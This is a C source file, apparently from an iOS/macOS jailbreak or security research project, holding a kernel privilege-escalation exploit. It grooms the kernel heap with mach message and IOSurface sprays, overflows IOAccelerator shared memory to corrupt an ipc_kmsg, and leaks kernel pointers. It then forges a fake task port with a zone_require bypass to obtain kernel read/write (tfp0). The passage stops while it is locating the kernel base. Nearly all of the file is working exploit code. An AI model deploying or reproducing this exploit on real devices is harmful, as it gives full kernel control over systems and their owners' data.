#include <stdio.h>

#include "print.h"
#include "ioaccel.h"
#include "iosurface.h"
#include "exploit_utilities.h"
#include "exploit.h"
#include "iokit.h"
#include "ENABLE_HELPER.h"

#include "helper/offsets.h"
#include "helper/krw.h"
#include "helper/find_port.h"

extern uint64_t kbase;
extern uint64_t kslide;

#if ENABLE_HELPER
#include "helper/kexecute.h"
#include "helper/find_shmem.h"
#include "helper/find_IOSurface.h"
#include "helper/translations.h"
#endif

// our task port
uint64_t our_port_addr = 0;

extern mach_port_t tfp0;

// Kernel Page Size.
extern mach_vm_size_t pagesize;

// The ID of the IOSurface we're using.
extern uint32_t IOSurface_id;

// An IOSurfaceRootUserClient instance.
extern mach_port_t IOSurfaceRootUserClient;

int exploit(void) {

	return 0;
}

// OSArray stuffs
// OSObject_1 *__fastcall OSArray::getObject(const OSArray_1 *this, unsigned int index)
uint64_t OSArray_objectAtIndex(uint64_t array, int idx) {
    uint64_t array_buffer = kread64(array + off_osarray_array); // 0x20 = p/x offsetof(OSArray, array)
    return kread64(array_buffer + idx * sizeof(uint64_t));
}

uint32_t OSArray_getCapacity(uint64_t array) {
    return kread32(array + off_osarray_capacity); 	// 0x18 = p/x offsetof(OSArray, capacity)
}

uint64_t OSData_buffer(uint64_t osdata) {
    return kread64(osdata + off_osdata_data);	// 0x18 = p/x offsetof(OSData, data)
}

void OSData_setBuffer(uint64_t osdata, uint64_t buffer) {
    kwrite64(osdata + off_osdata_data, buffer);
}

uint32_t OSData_capacity(uint64_t osdata) {
    return kread32(osdata + off_osdata_capacity);
}

void OSData_setCapacity(uint64_t osdata, uint32_t length) {
    kwrite32(osdata + off_osdata_capacity, length);    // 0x10 = p/x offsetof(OSData, capacity)
}

uint64_t OSDictionary_objectAtIndex(uint64_t osdict, int idx) {
    uint64_t dict_buffer = kread64(osdict + off_osdictionary_dictionary); // 0x20 = p/x offsetof(OSDictionary, dictionary)
    return kread64(dict_buffer + idx * sizeof(uint64_t));
}

// get all_properties property from an IOSurfaceRootUserClient mach port. this is an OSDictionary * where all properties are set using setValue
uint64_t get_all_properties(mach_port_t IOSurfaceRootUserClient) {
    uint64_t IOSRUC_port_addr = find_port(IOSurfaceRootUserClient); // struct ipc_port *
    uint64_t IOSRUC_addr = kread64(IOSRUC_port_addr + off_ipc_port_ip_kobject); // IOSurfaceRootUserClient *
    uint64_t IOSC_addr = kread64(kread64(IOSRUC_addr + 0x118) + 8 * IOSurface_id); // IOSurfaceClient *
    uint64_t IOSurface_addr = kread64(IOSC_addr + 0x40); // IOSurface *
    uint64_t all_properties = kread64(IOSurface_addr + 0xe8); // OSDictionary *
    return all_properties;
}

uint64_t OSDictionary_objectForKey(uint64_t dict, char *key) {
    uint64_t dict_buffer = kread64(dict + 0x20); // void * // 0x20 = offsetof(OSDictionary, dictionary);
    
    int i = 0;
    uint64_t key_sym = 0;
    do {
        key_sym = kread64(dict_buffer + i); // OSSymbol *
        uint64_t key_buffer = kread64(key_sym + 0x10); // char * // 0x10 = p/x offsetof(OSString, string)
        if (!kstrcmp_u(key_buffer, key)) {
            return kread64(dict_buffer + i + 8);
        }
        i += 16;
    }
    while (key_sym);
    
    return 0;
}

uint64_t address_of_property_key(mach_port_t IOSurfaceRootUserClient, uint32_t key) {
    uint64_t all_properties = get_all_properties(IOSurfaceRootUserClient);
    char *skey = malloc(5);
    memcpy(skey, &key, 4);
    uint64_t value = OSDictionary_objectForKey(all_properties, skey);
    free(skey);
    return value;
}


static inline uint32_t mach_port_waitq_flags() {
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type              = WQT_QUEUE;
    waitq_flags.waitq_fifo              = 1;
    waitq_flags.waitq_prepost           = 0;
    waitq_flags.waitq_irq               = 0;
    waitq_flags.waitq_isvalid           = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

uint64_t find_port_via_cuck00(mach_port_t port) {
    uint64_t refs[8] = { 0x4141414141414141, 0x4242424242424242, 0x4343434343434343, 0x4545454545454545, 0x4646464646464646, 0x4747474747474747, 0x4848484848484848, 0x4949494949494949 };

    uint64_t in[3] = { 0, 0, 0 };
    kern_return_t ret = IOConnectCallAsyncStructMethod(IOSurfaceRootUserClient, IOSurfaceRootUserClient_set_notify_selector, port, refs, 8, in, sizeof(in), NULL, NULL);
    if (ret) {
        return 0;
    }

    uint64_t id = IOSurface_id;
    ret = IOConnectCallScalarMethod(IOSurfaceRootUserClient, IOSurfaceRootUserClient_increment_use_count_selector, &id, 1, NULL, NULL);
    if (ret) {
        return 0;
    }

    ret = IOConnectCallScalarMethod(IOSurfaceRootUserClient, IOSurfaceRootUserClient_decrement_use_count_selector, &id, 1, NULL, NULL);
    if (ret) {
        return 0;
    }

    struct {
        mach_msg_header_t head;
        struct {
            mach_msg_size_t size;
            natural_t type;
            uintptr_t ref[8];
        } notify;
        struct {
            kern_return_t ret;
            uintptr_t ref[8];
        } content;
        mach_msg_max_trailer_t trailer;
    } msg = {};
    
    ret = mach_msg(&msg.head, MACH_RCV_MSG, 0, sizeof(msg), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    
    if (ret) {
        return 0;
    }

    return msg.notify.ref[0] & ~3;
}

uint32_t rk32_via_fakeport(mach_port_t fakeport, uint64_t *bsd_info, uint64_t address) {
    *bsd_info = address - off_p_pid;
    uint32_t value = 0x0;
    int ret = pid_for_task(fakeport, (int *)&value);
    if (ret) {
        return 0;
    }
    return value;
}

uint64_t rk64_via_fakeport(mach_port_t fakeport, uint64_t *bsd_info, uint64_t address) {
    uint32_t readp_tmp = rk32_via_fakeport(fakeport, bsd_info, address + 4);
    uint64_t value = rk32_via_fakeport(fakeport, bsd_info, address);
    value |= (uint64_t)readp_tmp << 32;
    return value;
}

int main(int argc, char *argv[], char *envp[]) {
    int ret = 0;

	IOAccelerator_init();
	IOSurface_init();
    offsets_init();

#if ENABLE_HELPER
	init_tfp0(); 
	INFO("tfp0: 0x%" PRIx32 "\n", tfp0);

	int r = get_kbase(&kbase);
    INFO("get_kbase ret: %d, kbase: 0x%llx, kslide: 0x%llx\n", r, kbase, kslide);
    init_kexecute();
#endif

    void *data = NULL;
	mach_port_t ports[port_cnt] = {};

	// setup 200 ports for later use
    for (int i = 0; i < port_cnt; i++) {
        ports[i] = new_mach_port();
		// INFO("got new_mach_port[%d]: 0x%x\n", i, ports[i]);
    }

	int port_i = 0;
#define POP_PORT() ports[port_i++]

// ----------- heap pre-exploit setup ----------- //
    INFO("Doing stage 0 heap setup\n");

	// fill kalloc_map so new allocations are always done in kernel_map (where our buffer that will get overflowed is)
    mach_port_t saved_ports[10];
    mach_msg_size_t msg_size = message_size_for_kalloc_size(7 * pagesize) - sizeof(struct simple_msg);
    data = calloc(1, msg_size);
    size_t stage0_sz = pagesize == 0x4000 ? 10 MB : 5 MB;
    for (int i = 0; i < 10; i++) {
        saved_ports[i] = POP_PORT();

        #if ENABLE_HELPER
        //helper; set signature
        if((i % 2) == 0) {memset(data, 0x74, msg_size);}
        else {memset(data, 0x72, msg_size);}
        #endif

        for (int j = 0; j < stage0_sz / (7 * pagesize); j++) {
            
            kern_return_t ret = send_message(saved_ports[i], data, msg_size);
            
            if (ret) {
                ERROR("Failed to send message\n");
                goto err;
            }
        }

        #if ENABLE_HELPER
        //helper; obtain msgdata_kptr
        uint64_t kmsgdata_kptr = find_kmsgdata_from_port(saved_ports[i]);
        INFO("saved_ports[%d](port=0x%x)'s msgdata_kptr = 0x%llx\n", i, saved_ports[i], kmsgdata_kptr);
        #endif
    }
    
    
    free(data);
    data = NULL;

    // we'll never do allocations smaller than 8 pages, so create some 7 page holes so the system can do small allocations there and leave us in peace
    mach_port_destroy(mach_task_self(), saved_ports[0]);
    mach_port_destroy(mach_task_self(), saved_ports[2]);
    mach_port_destroy(mach_task_self(), saved_ports[4]);
    mach_port_destroy(mach_task_self(), saved_ports[5]);
    mach_port_destroy(mach_task_self(), saved_ports[7]);
    mach_port_destroy(mach_task_self(), saved_ports[9]);

    // make a bunch of 8 page allocations to ensure there are no holes that mess with our allocations
    mach_port_t spray = POP_PORT();
    msg_size = message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg);
    data = calloc(1, msg_size);
    
    #if ENABLE_HELPER
    //helper; set signature
    memset(data, 0x81, msg_size);
    #endif

    for (int i = 0; i < MACH_PORT_QLIMIT_LARGE; i++) {  //MACH_PORT_QLIMIT_LARGE = (1024)
        kern_return_t ret = send_message(spray, data, msg_size);
        if (ret) {
            printf("[-] Failed to send message\n");
            goto err;
        }
    }

    #if ENABLE_HELPER
    //helper; obtain msgdata_kptr 
    uint64_t kmsgdata_kptr = find_kmsgdata_from_port(spray);
    INFO("spray(port=0x%x)'s msgdata_kptr = 0x%llx\n", spray, kmsgdata_kptr);
    // getchar();
    //
    #endif

    // ----------- heap stage 1 setup -----------//
    
    INFO("Doing stage 1 heap setup\n");
    
    int property_index = 0;
    uint32_t huge_kalloc_key = transpose(property_index++);
    ret = IOSurface_empty_kalloc(82 MB, huge_kalloc_key);
    if (ret) {
        ERROR("Failed to allocate empty kalloc buffer (ret: 0x%x, %s)\n", ret, mach_error_string(ret));
        goto err;
    }

    #if ENABLE_HELPER
    //helper; find our sprayed IOSurface data
    uint64_t userspaceValueDicts = userdict_from_IOSurface();
	INFO("IOSurface's userspaceValueDicts: 0x%llx\n", userspaceValueDicts);
    struct kOSDict *dict = kernel_fetch_dict(userspaceValueDicts);
    uint64_t osdict_entry = 0;
    
    for (int i = 0; i < dict->count; i++) {
		if(dict->items[i].value) {
            uint32_t osdict_count = kread32(dict->items[i].value + off_osdictionary_count);
	        uint32_t osdict_capacity = kread32(dict->items[i].value + off_osdictionary_capacity);
            osdict_entry = kread64(dict->items[i].value + off_osdictionary_dictionary);

            if(osdict_capacity == (82 MB / 0x10)) {
                uint64_t osdictentry_key = kread64(osdict_entry + off_osdictentry_dict);  
                uint64_t osdict_kbuffer = kread64(osdictentry_key + off_osstring_string);
                
                if(kread32(osdict_kbuffer) == 0xaabbcc) {
                    SUCCESS("Found our 1st sprayed IOSurface data!\n");
                    INFO("OSDict from userspaceValueDicts[%u] = 0x%llx\n", i, dict->items[i].value);
                    INFO("osdict_count = 0x%x, osdict_capacity = 0x%x, osdict_entry = 0x%llx\n", osdict_count, osdict_capacity, osdict_entry);
                    INFO("osdictentry_key = 0x%llx\n", osdictentry_key);
                    INFO("osdict_kbuffer = 0x%llx -> 0x%x\n", osdict_kbuffer, kread32(osdict_kbuffer));
                    break;
                }
            }
		}
    }
    // getchar();
    //
    #endif

    
    // setup the buffers that we'll overflow
    struct IOAccelDeviceShmemData cmdbuf, seglist;
    uint64_t command_buffer_shmem_sig = 0x4142434445464748;
	uint64_t segment_list_shmem_sig = 0x5152535455565758;
    ret = alloc_shmem_with_sig(96 MB, &cmdbuf, &seglist, command_buffer_shmem_sig, segment_list_shmem_sig);

    if (ret) {
        ERROR("Failed to allocate shared memory\n");
        goto err;
    }

    #if ENABLE_HELPER
    //helper; find our 96MB shmem data
    // translation_init();
    uint64_t command_buffer_shmem_data_kva, segment_list_shmem_data_kva = 0;
	find_shmem_in_kernel_4(&command_buffer_shmem_data_kva, &segment_list_shmem_data_kva, command_buffer_shmem_sig, segment_list_shmem_sig, osdict_entry);
	SUCCESS("command_buffer_shmem_data_kva: 0x%llx\n", command_buffer_shmem_data_kva);
	SUCCESS("segment_list_shmem_data_kva: 0x%llx\n", segment_list_shmem_data_kva);
    //
    #endif

    // heap now:
    // ------------------+------------------+------------------+----------------
    //     huge kalloc   |   segment list   |  command buffer  |
    // ------------------+------------------+------------------+----------------
    //

    // port which we will later corrupt. should be exactly after command buffer
    mach_port_t corrupted_kmsg_port = POP_PORT();
    ret = send_message(corrupted_kmsg_port, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
    if (ret) {
        printf("[-] Failed to send message\n");
        goto err;
    }

    #if ENABLE_HELPER
    //helper; obtain struct ipc_kmsg's addr
    uint64_t ikmq_base = kread64(find_port(corrupted_kmsg_port) + off_ipc_port_ikmq_base);
    uint64_t ipc_kmsg_addr = ikmq_base;
    INFO("struct ipc_kmsg(port=0x%x) = 0x%llx\n", corrupted_kmsg_port, ipc_kmsg_addr);
    // getchar();
    //
    #endif

    // now:
    // ------------------+------------------+------------------+-----------------+-----------
    //     huge kalloc   |   segment list   |  command buffer  | struct ipc_kmsg |
    // ------------------+------------------+------------------+-----------------+-----------
    //



    // this is a placeholder, we need it allocated for now but later it'll be freed and allocated with controlled data which will be UAFd
    mach_port_t placeholder_message_port = POP_PORT();
    ret = send_message(placeholder_message_port, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
    if (ret) {
        printf("[-] Failed to send message\n");
        goto err;
    }

    #if ENABLE_HELPER
    //helper; obtain struct ipc_kmsg 2's addr
    ikmq_base = kread64(find_port(placeholder_message_port) + off_ipc_port_ikmq_base);
    uint64_t ipc_kmsg2_addr = ikmq_base;
    INFO("struct ipc_kmsg 2(port=0x%x) = 0x%llx\n", placeholder_message_port, ipc_kmsg2_addr);
    // getchar();
    //
    #endif
    
    // allocate ool buffer which we'll also UAF
    mach_port_t ool_message_port = POP_PORT();
    int ool_ports_count = (7 * pagesize) / sizeof(uint64_t) + 1;
    ret = send_ool_ports(ool_message_port, MACH_PORT_NULL, ool_ports_count, MACH_MSG_TYPE_COPY_SEND);
    if (ret) {
        printf("[-] Failed to send ool ports message\n");
        goto err;
    }

    #if ENABLE_HELPER
    //helper; obtain ool ports addr
    uint64_t oolports_kptr = find_oolports_from_port(ool_message_port);
    INFO("ool_message_port(port=0x%x)'s msgdata_kptr = 0x%llx\n", ool_message_port, oolports_kptr);
    // khexdump(kread64(kmsgdata_kptr+4), 0x1000);
    // getchar();
    //
    #endif
    
    // now:
    // ------------------+------------------+------------------+-----------------+-------------------+-----------+
    //     huge kalloc   |   segment list   |  command buffer  | struct ipc_kmsg | struct ipc_kmsg 2 | ool ports |
    // ------------------+------------------+------------------+-----------------+-------------------+-----------+
    //

    // free huge allocation
    ret = IOSurface_remove_property(huge_kalloc_key);
    if (ret) {
        printf("[-] Failed to remove IOSurface property\n");
        goto err;
    }

    void *spray_buffer = ((uint8_t *) cmdbuf.data) + pagesize;

    uint32_t kfree_buffer_key = transpose(property_index++);
    memset(spray_buffer, 0x42, 8 * pagesize); // we'll need later in clean up to check if memory is still allocated
    ret = IOSurface_kmem_alloc_spray(spray_buffer, 8 * pagesize, 80 MB / (8 * pagesize), kfree_buffer_key);
    if (ret) {
        printf("[-] Failed to spray\n");
        goto err;
    }

    #if ENABLE_HELPER
    dict = kernel_fetch_dict(userspaceValueDicts);
    uint64_t kfree_buffer_addr = 0;
    
    for (int i = 0; i < dict->count; i++) {
		if(dict->items[i].value) {
            uint32_t osarray_count = kread32(dict->items[i].value + off_osarray_count);
	        uint32_t osarray_capacity = kread32(dict->items[i].value + off_osarray_capacity);
            uint64_t osarray_array = kread64(dict->items[i].value + off_osarray_array);

            if(osarray_count == (80 MB / (8 * pagesize))) {
                SUCCESS("Found our 2nd sprayed IOSurface data!\n");
                // INFO("osarray_count = 0x%x, osarray_capacity = 0x%x\n", osarray_capacity, osarray_capacity);

                for(uint32_t j = 0; j < osarray_count; j++) {
                    uint64_t osdata_in_osarray = OSArray_objectAtIndex(dict->items[i].value, j);
		            uint64_t kbuffer = OSData_buffer(osdata_in_osarray);
                    printf("osdata_in_osarray = 0x%llx\n", osdata_in_osarray);
                    printf("osdata_kbuffer(OSArray[%u]) = 0x%llx\n", j, kbuffer);
                    if(oolports_kptr < kbuffer) {
                        kfree_buffer_addr = kbuffer;
                        break;
                    }
                }
            }
		}
    }

    // printf("\n\n=================== Overall Info ===================\n");
    // printf("seglist =                   0x%llx\n", segment_list_shmem_data_kva);
    // printf("cmdbuf =                    0x%llx\n", command_buffer_shmem_data_kva);
    // printf("ipc_kmsg =                  0x%llx\n", ipc_kmsg_addr);
    // printf("ipc_kmsg2(FREED) =          0x%llx\n", ipc_kmsg2_addr);
    // printf("oolports =                  0x%llx\n", oolports_kptr);
    // printf("kfree_buffer =              0x%llx\n", kfree_buffer_addr);
    // printf("====================================================\n\n");
    #endif
    mach_port_destroy(mach_task_self(), placeholder_message_port);

    
    // now:
    // +------------------+------------------+-----------------+--------+-----------+--------------+
    // |   segment list   |  command buffer  | struct ipc_kmsg |  free  | ool ports | kfree_buffer |
    // +------------------+------------------+-----------------+--------+-----------+--------------+
    //

    uint32_t spray_buffer_key = transpose(property_index++);
    ret = IOSurface_kmem_alloc_spray(spray_buffer, 8 * pagesize, 80 MB / (8 * pagesize), spray_buffer_key);
    if (ret) {
        printf("[-] Failed to spray\n");
        goto err;
    }

    #if ENABLE_HELPER
    dict = kernel_fetch_dict(userspaceValueDicts);
    uint64_t spray_buffer_addr = 0;
    
    for (int i = 0; i < dict->count; i++) {
		if(dict->items[i].value) {
            uint32_t osarray_count = kread32(dict->items[i].value + off_osarray_count);
	        uint32_t osarray_capacity = kread32(dict->items[i].value + off_osarray_capacity);
            uint64_t osarray_array = kread64(dict->items[i].value + off_osarray_array);

            if(osarray_count == (80 MB / (8 * pagesize)) && i == 2) {
                SUCCESS("Found our 3rd sprayed IOSurface data!\n");
                INFO("osarray_count = 0x%x, osarray_capacity = 0x%x, osarray_array = 0x%llx\n", osarray_capacity, osarray_capacity, osarray_array);

                for(uint32_t j = 0; j < osarray_count; j++) {
                    uint64_t osdata_in_osarray = OSArray_objectAtIndex(dict->items[i].value, j);
		            uint64_t kbuffer = OSData_buffer(osdata_in_osarray);
                    // printf("osdata_in_osarray = 0x%llx\n", osdata_in_osarray);
                    // printf("osdata_kbuffer(OSArray[%u]) = 0x%llx\n", j, kbuffer);
                    if(ipc_kmsg_addr < kbuffer && kbuffer < oolports_kptr) {
                        spray_buffer_addr = kbuffer;
                        break;
                    }
                }
                // spray_buffer_addr = kbuffer;
            }
		}
    }

    printf("\n\n=================== Overall Info ===================\n");
    printf("seglist =                   0x%llx\n", segment_list_shmem_data_kva);
    printf("cmdbuf =                    0x%llx\n", command_buffer_shmem_data_kva);
    printf("ipc_kmsg =                  0x%llx\n", ipc_kmsg_addr);
    printf("ipc_kmsg2(FREED) =          0x%llx\n", ipc_kmsg2_addr);
    printf("[*] spray_buffer =          0x%llx\n", spray_buffer_addr);
    printf("oolports =                  0x%llx\n", oolports_kptr);
    printf("kfree_buffer =              0x%llx\n", kfree_buffer_addr);
    printf("====================================================\n\n");

    // INFO("spinning here...\n"); 
    // getchar();
    #endif
    
    // now:
    // +------------------+------------------+-----------------+--------------+-----------+--------------+
    // |   segment list   |  command buffer  | struct ipc_kmsg | spray_buffer | ool_ports | kfree_buffer |
    // +------------------+------------------+-----------------+--------------+-----------+--------------+
    //

    size_t minimum_corrupted_size = 3 * (8 * pagesize) - 0x58; // 0x5ffa8 on 16K and 0x17fa8 on 4K
    
retry:;
    int overflow_size = 0;
    uint64_t ts = mach_absolute_time();
    if (minimum_corrupted_size < ts && ts <= ((minimum_corrupted_size << 8) | 0xff)) {
        overflow_size = 8;
    }
    else if (((minimum_corrupted_size << 8) | 0xff) < ts && ts <= ((minimum_corrupted_size << 16) | 0xffff)) {
        overflow_size = 7;
    }
    else if (((minimum_corrupted_size << 16) | 0xffff) < ts && ts <= ((minimum_corrupted_size << 24) | 0xffffff)) {
        overflow_size = 6;
    }
    else if (((minimum_corrupted_size << 24) | 0xffffff) < ts && ts <= ((minimum_corrupted_size << 32) | 0xffffffff)) {
        overflow_size = 5;
    }
    else if (((minimum_corrupted_size << 32) | 0xffffffff) < ts && ts <= ((minimum_corrupted_size << 36) | 0xffffffffff)) {
        overflow_size = 4;
    }
    else if (((minimum_corrupted_size << 36) | 0xffffffffff) < ts && ts <= ((minimum_corrupted_size << 40) | 0xffffffffffff)) {
        overflow_size = 3;
    }
    
    uint32_t ipc_kmsg_size = (uint32_t) (ts >> (8 * (8 - overflow_size)));
    if (ipc_kmsg_size < (minimum_corrupted_size + 1) || ipc_kmsg_size > 0x0400a8ff) {
        printf("[-] Probably won't work with this timestamp, retrying...\n");
        usleep(100);
        goto retry;
    }
    INFO("ts for corrupting ipc_kmsg's ikm_size = 0x%llx\n", ts);

#if ENABLE_HELPER
    uint32_t ikm_size_orig = kread32(ipc_kmsg_addr);
    INFO("Original ipc_kmsg's ikm_size: 0x%x\n", ikm_size_orig);
#endif
    
    printf("[*] Triggering bug with %d bytes\n", overflow_size);
    overflow_n_bytes(96 MB, overflow_size, &cmdbuf, &seglist);
    printf("[*] Corruption worked?\n");

#if ENABLE_HELPER
    uint32_t ikm_size_corrupted = kread32(ipc_kmsg_addr);
    INFO("Corrupted ipc_kmsg's ikm_size: 0x%x\n", ikm_size_corrupted);
#endif

    mach_port_destroy(mach_task_self(), corrupted_kmsg_port);
    printf("[*] Freed kmsg\n");

    // now:
    // +------------------+------------------+------+------+------+------+----------------------+
    // |   segment list   |  command buffer  | free | free | free | free | part of kfree_buffer |
    // +------------------+------------------+------+------+------+------+----------------------+
    //

    mach_port_t message_leaking_port = POP_PORT();
    
    for (int i = 0; i < 1024; i++) {
        ret = send_message(message_leaking_port, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
        if (ret) {
            printf("[-] Failed to send message\n");
            goto err;
        }
    }

// #if ENABLE_HELPER
//     ikmq_base = kread64(find_port(message_leaking_port) + off_ipc_port_ikmq_base);
//     INFO("struct ipc_kmsg (port=0x%x) = 0x%llx\n", message_leaking_port, ikmq_base);
//     getchar();
// #endif

    // now:
    // +------------------+------------------+----------+----------+----------+----------+----------------------+
    // |   segment list   |  command buffer  | ipc_kmsg | ipc_kmsg | ipc_kmsg | ipc_kmsg | part of kfree_buffer |
    // +------------------+------------------+----------+----------+----------+----------+----------------------+
    //

    free(data);
    data = NULL;
    
    uint32_t argsSz = sizeof(struct IOSurfaceValueArgs) + 2 * sizeof(uint32_t);
    struct IOSurfaceValueArgs *in = malloc(argsSz);
    bzero(in, argsSz);
    in->surface_id = IOSurface_id;
    in->xml[0] = spray_buffer_key;
    in->xml[1] = 0;
    
    // this buffer is now an ipc_kmsg struct, read it back
    size_t out_size = 82 MB; // make it bigger than actual; that works for both cases
    ret = IOSurface_get_value(in, 16, spray_buffer, &out_size);
    if (ret) {
        printf("[-] Failed to read back value\n");
        goto err;
    }
    
    free(in);

    uint32_t ikm_size = 8 * (uint32_t)pagesize - 0x58;
    void *ipc_kmsg = memmem(spray_buffer, out_size, &ikm_size, sizeof(ikm_size));
    if (!ipc_kmsg) {
        printf("[-] Failed to leak ipc_kmsg\n");
        goto err;
    }

    // ikm_header = beginning of struct + something, we can use this to calculate the address of the shared memory buffer
    uint64_t ikm_header = *(uint64_t*)(ipc_kmsg + 24);
    uint64_t segment_list_addr = ikm_header - 96 MB - 96 MB - 8 * pagesize - 2 * pagesize - 0x28;
    
    printf("[+] ikm_header leak: 0x%llx\n", ikm_header);
    printf("[+] Segment list calculated to be at: 0x%llx\n", segment_list_addr);
    
    uint64_t fake_port_page_addr = segment_list_addr + 96 MB; // = addr of command buffer
    uint64_t fake_port_addr = fake_port_page_addr + 0x100;
    
    uint64_t fake_task_page_addr = segment_list_addr + pagesize + 96 MB; // = addr of command buffer + pagesize
    uint64_t fake_task_addr = fake_task_page_addr + 0x100;

    mach_port_destroy(mach_task_self(), message_leaking_port);

    // now:
    // +------------------+------------------+------+------+------+------+----------------------+
    // |   segment list   |  command buffer  | free | free | free | free | part of kfree_buffer |
    // +------------------+------------------+------+------+------+------+----------------------+
    //
    
    data = malloc(8 * pagesize);
    for (int i = 0; i < 8 * pagesize / 8; i++) {
        ((uint64_t*)data)[i] = fake_port_addr;
    }
    
    uint32_t ool_ports_realloc_buffer_key = transpose(property_index++);
    ret = IOSurface_kmem_alloc_spray(data, 8 * pagesize, 1000, ool_ports_realloc_buffer_key);
    if (ret) {
        printf("[-] Failed to spray\n");
        goto err;
    }

    // bazad's fix for a kernel data abort
    make_buffer_readable_by_kernel(cmdbuf.data, 2);
    memset(cmdbuf.data, 0, 2 * pagesize);

    // setup fake port & fake task
    kport_t *fake_port = cmdbuf.data + 0x100;
    ktask_t *fake_task = cmdbuf.data + pagesize + 0x100;
        
    uint8_t *fake_port_page = cmdbuf.data;
    uint8_t *fake_task_page = cmdbuf.data + pagesize;

    // zone_require bypass
    // 0x16 = .zindex
    // 42 = .ipc_ports_zindex; zindex of the "ipc_ports" zone
    // 58 = .tasks_zindex; zindex of the "tasks" zone
    *(uint16_t *)(fake_port_page + 0x16) = 42;
#if __arm64e__
    *(fake_task_page + 0x16) = 57;
#else
    *(uint16_t *) (fake_task_page + 0x16) = 58;
#endif
        
    fake_port->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fake_port->ip_references = 0xd00d;
    fake_port->ip_lock.type = 0x11;
    fake_port->ip_messages.port.receiver_name = 1;
    fake_port->ip_messages.port.msgcount = 0;
    fake_port->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fake_port->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fake_port->ip_srights = 99;
    fake_port->ip_kobject = fake_task_addr;
        
    fake_task->ref_count = 0xff;
    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->ref_count = 100;
    fake_task->active = 1;

    // receive back the fake ports
    struct ool_msg *ool = (struct ool_msg *)receive_message(ool_message_port, sizeof(struct ool_msg) + 0x1000);
    mach_port_t fakeport = ((mach_port_t *)ool->ool_ports.address)[0];
    free(ool);
    ool = NULL;
    
    if (!fakeport) {
        printf("[-] Didn't get fakeport???\n");
        goto err;
    }
    
    printf("[+] fakeport: 0x%x\n", fakeport);

    uint64_t leaked_port_addr = find_port_via_cuck00(ool_message_port);
    if (!leaked_port_addr) {
        printf("[-] Failed to leak port address\n");
        goto err;
    }
    printf("[+] Leaked port: 0x%llx\n", leaked_port_addr);

        // ----------- kernel read ----------- //
    
    uint64_t *read_addr_ptr = (uint64_t *)((uint64_t)fake_task + off_task_bsd_info);
    
#define kr32(addr) rk32_via_fakeport(fakeport, read_addr_ptr, addr)
#define kr64(addr) rk64_via_fakeport(fakeport, read_addr_ptr, addr)

    uint64_t ipc_space = kr64(leaked_port_addr + off_ipc_port_ip_receiver);
    if (!ipc_space) {
        printf("[-] Kernel read failed!\n");
        goto err;
    }
    printf("[+] Got kernel read\n");
    
    uint64_t kernel_vm_map = 0;
    uint64_t ipc_space_kernel = 0;
    
    uint64_t struct_task = kr64(ipc_space + off_ipc_space_is_task);
    our_port_addr = kr64(struct_task + off_task_itk_self);
    ipc_space_kernel = kr64(our_port_addr + offsetof(kport_t, ip_receiver));
    
    while (struct_task) {
        uint64_t bsd_info = kr64(struct_task + off_task_bsd_info);

        int pid = kr32(bsd_info + off_p_pid);
        if (pid == 0) {
            kernel_vm_map = kr64(struct_task + off_task_map);
            break;
        }
        
        struct_task = kr64(struct_task + off_task_prev);
    }
    
    printf("[+] Our task port: 0x%llx\n", our_port_addr);

    // ----------- tfp0! ----------- //
    
    fake_port->ip_receiver = ipc_space_kernel;
    *(uint64_t *)((uint64_t)fake_task + off_task_map) = kernel_vm_map;
    *(uint32_t *)((uint64_t)fake_task + off_task_itk_self) = 1;
    
    // update
    if(tfp0 != MACH_PORT_NULL) {
        mach_port_destroy(mach_task_self(), tfp0);
        tfp0 = MACH_PORT_NULL;
    }
    tfp0 = fakeport;

    printf("[+] Updated port for tfp0!\n");
    
    uint64_t addr = kalloc(8);
    if (!addr) {
        printf("[-] Seems like tfp0 port didn't work?\n");
        goto err;
    }
    
    printf("[*] Allocated: 0x%llx\n", addr);
    kwrite64(addr, 0x4141414141414141);
    uint64_t readb = kread64(addr);
    kfree(addr, 8);
    printf("[*] Read back: 0x%llx\n", readb);
    
    if (readb != 0x4141414141414141) {
        printf("[-] Read back value didn't match\n");
        goto err;
    }

    // Create stable tfp0 !!

    printf("[*] Creating safer port\n");
    
    mach_port_t new_tfp0 = POP_PORT();
    if (!new_tfp0) {
        printf("[-] Failed to allocate new tfp0 port\n");
        goto err;
    }
    
    uint64_t new_addr = find_port(new_tfp0);
    if (!new_addr) {
        printf("[-] Failed to find new tfp0 port address\n");
        goto err;
    }
    
    uint64_t faketask = kalloc(pagesize);
    if (!faketask) {
        printf("[-] Failed to kalloc faketask\n");
        goto err;
    }
    
    kwritebuf(faketask, fake_task_page, pagesize);
    fake_port->ip_kobject = faketask + 0x100;
    
    kwritebuf(new_addr, (const void*)fake_port, sizeof(kport_t));
    
    printf("[*] Testing new tfp0 port\n");
    tfp0 = new_tfp0;
    
    addr = kalloc(8);
    if (!addr) {
        printf("[-] Seems like the new tfp0 port didn't work?\n");
        goto err;
    }
    
    printf("[+] tfp0: 0x%x\n", new_tfp0);
    printf("[*] Allocated: 0x%llx\n", addr);
    kwrite64(addr, 0x4141414141414141);
    readb = kread64(addr);
    kfree(addr, 8);
    printf("[*] Read back: 0x%llx\n", readb);
    
    if (readb != 0x4141414141414141) {
        printf("[-] Read back value didn't match\n");
        goto err;
    }

    // ----------- find kernel base ----------- //
    uint64_t surfRoot = port_to_kobject(IOSurfaceRootUserClient);
    uint64_t IOSurfaceRootUserClient_vtab = kread64(surfRoot);
    IOSurfaceRootUserClient_vtab |= 0xffffff8000000000; // in case it has PAC
    uint64_t getExternalTrapForIndex_func = kread64(IOSurfaceRootUserClient_vtab + 8 * 0xb7);    // IOUserClient::getExternalTrapForIndex;  LDR X8, [X8,#0x5B8]
    getExternalTrapForIndex_func |= 0xffffff8000000000; // __ZN12IOUserClient23getExternalTrapForIndexEj; this address is inside the kernel image;
